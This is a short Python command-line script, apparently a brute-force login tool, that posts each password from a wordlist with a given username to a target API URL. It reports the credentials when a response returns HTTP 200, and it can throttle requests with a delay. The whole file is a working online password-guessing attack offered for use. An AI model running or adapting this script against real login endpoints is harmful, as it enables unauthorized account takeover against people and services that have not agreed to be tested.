import requests
import argparse
from time import sleep


parser=argparse.ArgumentParser()
parser._action_groups.pop()

required = parser.add_argument_group('required arguments')
optional = parser.add_argument_group('optional arguments')

required.add_argument("-t","--txt",help="Name of file txt with the passwords.",type=str,required=True,metavar="filename.txt")
required.add_argument("-l","--link",help="Url to make the post request must be a API.",type=str,required=True,metavar="http://example/")
required.add_argument("-u","--username",help="Username to prove every password",type=str,required=True,metavar="username")
optional.add_argument("-r","--requests",help="Number of requests to do, default: the lines in the file txt.",type=int,metavar="number",default=0)
optional.add_argument("-s","--seconds",help="Interval of seconds between every request.",type=int,metavar="seconds",default=0)


args=parser.parse_args()

def SRAS(file,url,username,time,number_of_requests):
    """This function do a post request

        file: is a txt with passwords
        url: url to make post requests
        useraname: username to prove every password

        void
    """
    count=0
    doble_jump="\n\n"
    try:
        f=open(file,"r",encoding="utf-8")
    except:
        print("error with the file")
        return
    print(f"\nusername: {username.strip()}", end=doble_jump)

    
    for line in f.readlines():
        payload={
            "password": line.strip(),
            "username": username.strip()
                }
        log=requests.post(url,data=payload)
        print("try password: "+ line.strip(),end="\r")
        if log.status_code==200:
            print()
            print()
            print(f"Credenciales encontradas:")
            print(f"username: {payload['username']}")
            print(f"password: {payload['password']}")
            return
        count+=1
        if number_of_requests==count:
            return
        sleep(time)
    print("Credentials not found")
    return 

SRAS(args.txt,args.link,args.username,args.seconds,args.requests)
